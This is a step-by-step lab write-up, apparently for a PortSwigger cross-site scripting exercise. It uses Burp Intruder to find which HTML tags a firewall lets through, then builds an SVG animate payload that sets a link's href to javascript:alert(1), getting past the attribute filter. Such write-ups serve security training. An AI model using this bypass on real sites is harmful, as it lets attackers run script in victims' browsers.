## Solution steps

- Open Burp suite and set up proxy (Keep the intercept off).
- In the search box try submitting `<h1>` and observe the response: `"Tag is not allowed"`
- From Http history, go to the `GET` request we made to the search end-point.
- Send the request to intruder and enter payload markers inside angle brackets: `GET /?search=<§§> HTTP/1.1`
- Go to portswigger's Cross-site scripting cheat sheet and copy the tags.
- Paste the tags in the payloads section of Burp intruder and start the attack.
- Observe `a`, `animate`, `image`, `svg` and `title` tags are allowed as their status code is `200`.
- Enter `<a>Click me!</a>` in the search box and notice it gets executed.
- Try entering this payload: `<a href="javascript:alert(1)">Click me</a>`.
- We have hit the firewall: `"Attribute is not allowed"`
- Craft a payload using svg tag: `<svg><a><text x=20 y=20>Click me</text></a>`. Observe that it gets executed.
- Add an animate tag to the final payload: `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>`
- Copy and paste the above payload in the search box to solve the lab.

### What the payload does

- `<svg>` – Scalable Vector Graphics, a commonly whitelisted tag with script-like powers.
- `<a>` – Anchor tag used here without href initially.
- `<animate>` – A lesser-known SVG tag that can change the value of an attribute over time.
  - `attributeName=href`: This targets the href attribute of the `<a>` tag.
  - `values=javascript:alert(1)`: This sets the value to JavaScript, which gets executed.
- `<text>` – Visibly clickable text that says "Click me."
- So when the user clicks the text inside the SVG, the `href` is dynamically set to `javascript:alert(1)`, and the browser executes it as a valid JavaScript URL, successfully bypassing the attribute restrictions.
